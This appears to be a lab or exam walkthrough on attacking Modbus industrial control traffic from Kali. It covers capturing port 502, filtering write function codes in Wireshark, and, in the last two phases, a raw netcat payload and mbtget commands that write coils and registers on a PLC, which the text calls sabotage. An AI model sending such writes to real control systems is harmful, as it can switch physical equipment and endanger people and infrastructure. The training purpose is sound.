🔹 PHASE 1: Detect Modbus Traffic
🟥 Run on: Attacker (Kali)
🔍 Capture Traffic

tcpdump -i eth0 port 502 -nn

🔍 Explanation
-i eth0 → Interface
port 502 → Filter Modbus traffic
-nn → No DNS/port resolution
🎯 Output Example
IP 192.168.1.10.502 > 192.168.1.20.34567

👉 Confirms:

Modbus server (PLC)
Client (SCADA)
🔹 PHASE 2: Save Traffic for Analysis
🟥 Run on: Kali
🔥 Capture to File

tcpdump -i eth0 port 502 -w modbus.pcap

🔍 Explanation
-w modbus.pcap → Save capture
🔹 PHASE 3: Analyze in Wireshark
🟥 Run on: Kali GUI
🔍 Open File

wireshark modbus.pcap

🔥 Apply Filter

modbus

🎯 You See:
Function Codes
Register values
Commands
🔹 PHASE 4: Understand Modbus Packets
🔍 Key Fields (CRITICAL FOR EXAM)
Field	Meaning
Function Code	What action
Address	Register
Data	Value
🔥 Common Function Codes
Code	Action
1	Read Coils
3	Read Holding Registers
5	Write Single Coil
6	Write Register
16	Write Multiple Registers
🔹 PHASE 5: Identify Sensitive Operations
🟥 Run on: Wireshark
🔍 Filter Write Operations

modbus.func_code == 5
modbus.func_code == 6

🎯 Why?

👉 These modify device behavior

🔥 Example
Write Single Coil → Turn ON/OFF device

🧠 This is real-world sabotage

🔹 PHASE 6: Replay / Manipulate Traffic
🟥 Run on: Kali
🔥 Use netcat (RAW attack)
Example Payload (Manual Modbus Write)

printf '\x00\x01\x00\x00\x00\x06\x01\x05\x00\x00\xFF\x00' | nc 192.168.1.10 502

🔍 Explanation
Raw Modbus packet
\x05 → Function code (write coil)
\xFF00 → Turn ON
🔹 PHASE 7: Use Modbus Tools (Better Way)
🟥 Run on: Kali
🔧 Install Tool

sudo apt install mbtget

🔍 Read Registers

mbtget -r 0 -c 10 192.168.1.10

🔍 Explanation
-r 0 → Start register
-c 10 → Count
🔥 Write Register

mbtget -w 5 100 192.168.1.10

🔍 Explanation
Write value 100 to register 5
